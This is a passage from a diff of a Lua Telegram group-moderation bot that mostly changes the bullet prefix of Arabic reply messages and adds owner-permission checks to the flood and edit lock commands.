                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 8 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 8 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 8 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '9' then
@@ -3553,7 +3250,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 9 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 9 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 9 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '10' then
@@ -3563,14 +3260,14 @@ end
                      if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "_You Have'nt 10 Profile Photo!!_", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 10 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 10 في حسابك` ⚠️", 1, 'md')
 end
    end
  else
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا استطيع جلب اكثر من 10 صور` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا استطيع جلب اكثر من 10 صور` ⚠️", 1, 'md')
 end
    end
    end
@@ -3589,14 +3286,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [2-99999]_', 1, 'md')
 else
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
 end
 	else
     database:set('flood:max:'..msg.chat_id_,floodmax[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Flood has been set to_ *'..floodmax[2]..'*', 1, 'md')
         else
-send(msg.chat_id_, msg.id_, 1, '● - `تم وضع التكرار بالطرد للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `تم وضع التكرار بالطرد للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
 end
 	end
 end
@@ -3608,14 +3305,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [2-99999]_', 1, 'md')
        else 
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
 end
 	else
     database:set('flood:max:warn'..msg.chat_id_,floodmax[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Flood Warn has been set to_ *'..floodmax[2]..'*', 1, 'md')
        else 
-send(msg.chat_id_, msg.id_, 1, '● - `تم وضع التكرار بالكتم للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `تم وضع التكرار بالكتم للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
 end
 	end
 end
@@ -3626,14 +3323,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [2-99999]_', 1, 'md')
        else 
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[2]* الى [_99999_]` ⚠️', 1, 'md')
 end
 	else
     database:set('flood:max:del'..msg.chat_id_,floodmax[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Flood delete has been set to_ *'..floodmax[2]..'*', 1, 'md')
        else 
-send(msg.chat_id_, msg.id_, 1, '● - `تم وضع التكرار بالمسح للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `تم وضع التكرار بالمسح للعدد` ✓⬅️ : *'..floodmax[2]..'*', 1, 'md')
 end
 	end
 end
@@ -3644,14 +3341,14 @@ if tonumber(sensspam[2]) < 40 then
                 if database:get('lang:gp:'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [40-99999]_', 1, 'md')
 else 
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[40]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[40]* الى [_99999_]` ⚠️', 1, 'md')
 end
  else
 database:set('bot:sens:spam'..msg.chat_id_,sensspam[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '_> Spam has been set to_ *'..sensspam[2]..'*', 1, 'md')
 else 
-send(msg.chat_id_, msg.id_, 1, '● - `تم وضع الكليشه بالمسح للعدد` ✓⬅️ : *'..sensspam[2]..'*', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `تم وضع الكليشه بالمسح للعدد` ✓⬅️ : *'..sensspam[2]..'*', 1, 'md')
 end
 end
 end
@@ -3662,14 +3359,14 @@ if tonumber(sensspam[2]) < 40 then
                 if database:get('lang:gp:'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [40-99999]_', 1, 'md')
 else 
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[40]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[40]* الى [_99999_]` ⚠️', 1, 'md')
 end
  else
 database:set('bot:sens:spam:warn'..msg.chat_id_,sensspam[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '_> Spam Warn has been set to_ *'..sensspam[2]..'*', 1, 'md')
 else 
-send(msg.chat_id_, msg.id_, 1, '● - `تم وضع الكليشه بالتحذير للعدد` ✓⬅️ : *'..sensspam[2]..'*', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `تم وضع الكليشه بالتحذير للعدد` ✓⬅️ : *'..sensspam[2]..'*', 1, 'md')
 end
 end
 end
@@ -3682,14 +3379,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Wrong number*,_range is  [2-99999]_', 1, 'md')
        else 
-           send(msg.chat_id_, msg.id_, 1, '● - `ضع عدد من  *[1]* الى [_99999_]` ⚠️', 1, 'md')
+           send(msg.chat_id_, msg.id_, 1, '• `ضع عدد من  *[1]* الى [_99999_]` ⚠️', 1, 'md')
 end
 	else
     database:set('flood:time:'..msg.chat_id_,floodt[2])
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_> Flood has been set to_ *'..floodt[2]..'*', 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم وضع زمن التكرار للعدد ` ✓⬅️ : *'..floodt[2]..'*', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم وضع زمن التكرار للعدد ` ✓⬅️ : *'..floodt[2]..'*', 1, 'md')
 end
 	end
 	end
@@ -3699,7 +3396,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Please Send Group Link Now!*', 1, 'md')
 else 
-         send(msg.chat_id_, msg.id_, 1, '● - `قم بارسال الرابط ليتم حفظه` 📤', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `قم بارسال الرابط ليتم حفظه` 📤', 1, 'md')
 end
 	end
 	-----------------------------------------------------------------------------------------------
@@ -3709,13 +3406,13 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '<b>Group link:</b>\n'..link, 1, 'html')
        else 
-                  send(msg.chat_id_, msg.id_, 1, '● - <code>رابط المجموعه ⬇️ :</code>\n'..link, 1, 'html')
+                  send(msg.chat_id_, msg.id_, 1, '• <code>رابط المجموعه ⬇️ :</code>\n'..link, 1, 'html')
 end
 	  else
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*There is not link set yet. Please add one by #setlink .*', 1, 'md')
        else 
-                  send(msg.chat_id_, msg.id_, 1, '● - `لم يتم حفظ رابط ارسل [ وضع رابط ] لحفظ رابط جديد` ⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `لم يتم حفظ رابط ارسل [ وضع رابط ] لحفظ رابط جديد` ⚠️', 1, 'md')
 end
 	  end
  	end
@@ -3730,11 +3427,11 @@ end
 	end
 	
 	if text:match("^تفعيل الترحيب$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
-         send(msg.chat_id_, msg.id_, 1, '● - `تم تفعيل الترحيب ` ✔️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم تفعيل الترحيب ` ✔️', 1, 'md')
 		 database:set("bot:welcome"..msg.chat_id_,true)
 	end
 	if text:match("^تعطيل الترحيب$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
-         send(msg.chat_id_, msg.id_, 1, '● - `تم تعطيل الترحيب ` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم تعطيل الترحيب ` ⚠️', 1, 'md')
 		 database:del("bot:welcome"..msg.chat_id_)
 	end
 
@@ -3746,7 +3443,7 @@ end
 	
 	if text:match("^وضع ترحيب (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
 	local welcome = {string.match(text, "^(وضع ترحيب) (.*)$")} 
-         send(msg.chat_id_, msg.id_, 1, '● - `تم وضع الترحيب` ✓⬇️ :\n\n`'..welcome[2]..'`', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `تم وضع الترحيب` ✓⬇️ :\n\n`'..welcome[2]..'`', 1, 'md')
 		 database:set('welcome:'..msg.chat_id_,welcome[2])
 	end
 
@@ -3755,7 +3452,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*Welcome Msg Has Been Deleted!*', 1, 'md')
        else 
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم حذف الترحيب` ⚠️❌', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم حذف الترحيب` ⚠️❌', 1, 'md')
 end
 		 database:del('welcome:'..msg.chat_id_)
 	end
@@ -3764,12 +3461,12 @@ end
 	if text:match("^[Gg][Ee][Tt] [Ww][Ll][Cc]$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
 	local wel = database:get('welcome:'..msg.chat_id_)
 	if wel then
-         send(msg.chat_id_, msg.id_, 1, '● - `الترحيب ` ⬇️ :'..wel, 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `الترحيب ` ⬇️ :'..wel, 1, 'md')
     else 
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, 'Welcome msg not saved!', 1, 'md')
 else 
-         send(msg.chat_id_, msg.id_, 1, '● - `لم يتم وضع ترحيب للمجموعه` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `لم يتم وضع ترحيب للمجموعه` ⚠️', 1, 'md')
 end
 	end
 	end
@@ -3782,7 +3479,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
 		  send(msg.chat_id_, msg.id_, 1, "*New Word baded!*\n--> `"..name.."`", 1, 'md')
 else 
-  		  send(msg.chat_id_, msg.id_, 1, "● - `"..name.."` `تم اضافتها لقائمه المنع` ✔️", 1, 'md')
+  		  send(msg.chat_id_, msg.id_, 1, "• `"..name.."` `تم اضافتها لقائمه المنع` ✔️", 1, 'md')
 end
 	end
 	-----------------------------------------------------------------------------------------------
@@ -3794,7 +3491,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
 		  send(msg.chat_id_, msg.id_, 1, "`"..rws[2].."` *Removed From baded List!*", 1, 'md')
 else 
-  		  send(msg.chat_id_, msg.id_, 1, " ● - "..rws[2].."` تم حذفها من قائمه المنع` ❌⚠️", 1, 'md')
+  		  send(msg.chat_id_, msg.id_, 1, " • "..rws[2].."` تم حذفها من قائمه المنع` ❌⚠️", 1, 'md')
 end
 	end 
 	-----------------------------------------------------------------------------------------------
@@ -3809,7 +3506,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '*Done*\n_Your Msg Send to_ `'..gps..'` _Groups_', 1, 'md')
                    else
-                     send(msg.chat_id_, msg.id_, 1, '● - `تم نشر الرساله في` `'..gps..'` `مجموعه` ✔️', 1, 'md')
+                     send(msg.chat_id_, msg.id_, 1, '• `تم نشر الرساله في` `'..gps..'` `مجموعه` ✔️', 1, 'md')
 end
 	end
 	-----------------------------------------------------------------------------------------------
@@ -3820,35 +3517,41 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '*Groups :* `'..gps..'`', 1, 'md')
                  else
-                   send(msg.chat_id_, msg.id_, 1, '● - `عدد الكروبات هي ⬅️ :` *'..gps..'*', 1, 'md')
+                   send(msg.chat_id_, msg.id_, 1, '• `عدد الكروبات هي ⬅️ :` *'..gps..'*', 1, 'md')
 end
 	end
 	
 if  text:match("^[Mm][Ss][Gg]$") or text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  then
 local user_msgs = database:get('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
                 if database:get('lang:gp:'..msg.chat_id_) then
+       if not database:get('bot:id:mute'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "*Msgs : * `"..user_msgs.."`", 1, 'md')
+      else 
+        end
     else 
-      send(msg.chat_id_, msg.id_, 1, "● - `عدد رسائلك هي ⬅️ :` *"..user_msgs.."*", 1, 'md')
+       if not database:get('bot:id:mute'..msg.chat_id_) then
+      send(msg.chat_id_, msg.id_, 1, "• `عدد رسائلك هي ⬅️ :` *"..user_msgs.."*", 1, 'md')
+      else 
+        end
 end
 	end
 	-----------------------------------------------------------------------------------------------
 	if text:match("^[Ll][Oo][Cc][Kk] (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) or text:match("^قفل (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
 	local lockpt = {string.match(text, "^([Ll][Oo][Cc][Kk]) (.*)$")} 
 	local TSHAKEPT = {string.match(text, "^(قفل) (.*)$")} 
-    if lockpt[2] == "edit" or TSHAKEPT[2] == "التعديل" then
+    if lockpt[2] == "edit"and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEPT[2] == "التعديل" and is_owner(msg.sender_user_id_, msg.chat_id_) then
               if not database:get('editmsg'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, "_> Edit Has been_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التعديل `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التعديل `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
                 end
                 database:set('editmsg'..msg.chat_id_,'delmsg')
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Lock edit is already_ *locked*', 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التعديل` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التعديل` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
                 end
               end
             end
@@ -3857,62 +3560,62 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, "_> Bots Has been_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل البوتات `🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل البوتات `🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
                 end
                 database:set('bot:bots:mute'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                  send(msg.chat_id_, msg.id_, 1, "_> Bots is Already_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل البوتات` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل البوتات` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
                 end
               end
             end
-            	  if lockpt[2] == "flood ban" or TSHAKEPT[2] == "التكرار بالطرد" then
+            	  if lockpt[2] == "flood ban" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEPT[2] == "التكرار بالطرد" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if database:get('anti-flood:'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood ban* has been *unlocked*', 1, 'md')
                  else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `قفل التكرار `🔐\n\n● - `خاصية : الطرد `☑️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `قفل التكرار `🔐\n\n• `خاصية : الطرد `☑️', 1, 'md')
                   end
                 database:del('anti-flood:'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood ban* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n● - `خاصية : الطرد` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n• `خاصية : الطرد` ☑️', 1, 'md')
                 end
               end
             end
-            	  if lockpt[2] == "flood mute" or TSHAKEPT[2] == "التكرار بالكتم" then
+            	  if lockpt[2] == "flood mute" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEPT[2] == "التكرار بالكتم" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if database:get('anti-flood:warn'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood mute* has been *unlocked*', 1, 'md')
                  else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `قفل التكرار `🔐\n\n● - `خاصية : الكتم `☑️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `قفل التكرار `🔐\n\n• `خاصية : الكتم `☑️', 1, 'md')
                   end
                 database:del('anti-flood:warn'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood mute* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n● - `خاصية : الكتم` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n• `خاصية : الكتم` ☑️', 1, 'md')
                 end
               end
           end
-            	  if lockpt[2] == "flood del" or TSHAKEPT[2] == "التكرار بالمسح" then
+            	  if lockpt[2] == "flood del" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEPT[2] == "التكرار بالمسح" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if database:get('anti-flood:del'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood del* has been *unlocked*', 1, 'md')
                  else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `قفل التكرار `🔐\n\n● - `خاصية : المسح `☑️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `قفل التكرار `🔐\n\n• `خاصية : المسح `☑️', 1, 'md')
                   end
                 database:del('anti-flood:del'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood del* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التكرار` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
                 end
               end
             end
@@ -3921,14 +3624,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                  send(msg.chat_id_, msg.id_, 1, "_> Pin Has been_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التثبيت `🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التثبيت `🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
                 end
                 database:set('bot:pin:mute'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                             send(msg.chat_id_, msg.id_, 1, "_> Pin is Already_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التثبيت` 🔐\n\n● - `خاصية : المسح` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التثبيت` 🔐\n\n• `خاصية : المسح` ☑️', 1, 'md')
                 end
               end
             end
@@ -3937,14 +3640,14 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                  send(msg.chat_id_, msg.id_, 1, "_> Pin warn Has been_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `تم` ✔️ `قفل التثبيت `🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `تم` ✔️ `قفل التثبيت `🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
                 end
                 database:set('bot:pin:warn'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                             send(msg.chat_id_, msg.id_, 1, "_> Pin warn is Already_ *locked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `قفل التثبيت` 🔐\n\n● - `خاصية : التحذير` ☑️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `قفل التثبيت` 🔐\n\n• `خاصية : التحذير` ☑️', 1, 'md')
                 end
               end
             end
@@ -3955,19 +3658,19 @@ end
   	if text:match("^[Uu][Nn][Ll][Oo][Cc][Kk] (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) or text:match("^فتح (.*)$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
 	local unlockpt = {string.match(text, "^([Uu][Nn][Ll][Oo][Cc][Kk]) (.*)$")} 
 	local TSHAKEUN = {string.match(text, "^(فتح) (.*)$")} 
-                if unlockpt[2] == "edit" or TSHAKEUN[2] == "التعديل" then
+                if unlockpt[2] == "edit" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEUN[2] == "التعديل" and is_owner(msg.sender_user_id_, msg.chat_id_) then
               if database:get('editmsg'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Edit Has been_ *Unlocked*", 1, 'md')
                 else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التعديل `🔓\n\n● - `خاصية : التحذير `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التعديل `🔓\n\n• `خاصية : التحذير `⚠️', 1, 'md')
                 end
                 database:del('editmsg'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                   send(msg.chat_id_, msg.id_, 1, '_> Lock edit is already_ *Unlocked*', 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التعديل` 🔓\n\n● - `خاصية : التحذير` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التعديل` 🔓\n\n• `خاصية : التحذير` ⚠️', 1, 'md')
                 end
               end
             end
@@ -3976,62 +3679,62 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Bots Has been_ *Unlocked*", 1, 'md')
                 else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح البوتات `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح البوتات `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
                 end
                 database:del('bot:bots:mute'..msg.chat_id_)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> Bots is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح البوتات` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح البوتات` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
                 end
               end
             end
-            	  if unlockpt[2] == "flood ban" or TSHAKEUN[2] == "التكرار بالطرد" then
+            	  if unlockpt[2] == "flood ban" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEUN[2] == "التكرار بالطرد" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if not database:get('anti-flood:'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood ban* has been *unlocked*', 1, 'md')
                  else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التكرار `🔓\n\n● - `خاصية : الطرد `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التكرار `🔓\n\n• `خاصية : الطرد `⚠️', 1, 'md')
                   end
                    database:set('anti-flood:'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood ban* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n● - `خاصية : الطرد` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n• `خاصية : الطرد` ⚠️', 1, 'md')
                 end
               end
             end
-            	  if unlockpt[2] == "flood mute" or TSHAKEUN[2] == "التكرار بالكتم" then
+            	  if unlockpt[2] == "flood mute" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEUN[2] == "التكرار بالكتم" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if not database:get('anti-flood:warn'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood mute* has been *unlocked*', 1, 'md')
                  else
-                  send(msg.chat_id_, msg.id_, 1, '● - `تم `✔️ `فتح التكرار `🔓\n\n● - `خاصية : الكتم `⚠️', 1, 'md')
+                  send(msg.chat_id_, msg.id_, 1, '• `تم `✔️ `فتح التكرار `🔓\n\n• `خاصية : الكتم `⚠️', 1, 'md')
                   end
                    database:set('anti-flood:warn'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                     send(msg.chat_id_, msg.id_, 1, "_> *Flood mute* is Already_ *Unlocked*", 1, 'md')
                 else
-                 send(msg.chat_id_, msg.id_, 1, '● - `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n● - `خاصية : الكتم` ⚠️', 1, 'md')
+                 send(msg.chat_id_, msg.id_, 1, '• `بالفعل تم` ✔️ `فتح التكرار` 🔓\n\n• `خاصية : الكتم` ⚠️', 1, 'md')
                 end
               end
           end
-            	  if unlockpt[2] == "flood del" or TSHAKEUN[2] == "التكرار بالمسح" then
+            	  if unlockpt[2] == "flood del" and is_owner(msg.sender_user_id_, msg.chat_id_) or TSHAKEUN[2] == "التكرار بالمسح" and is_owner(msg.sender_user_id_, msg.chat_id_) then
                 if not database:get('anti-flood:del'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                    send(msg.chat_id_, msg.id_, 1, '_> *Flood del* has been *unlocked*', 1, 'md')
                  else
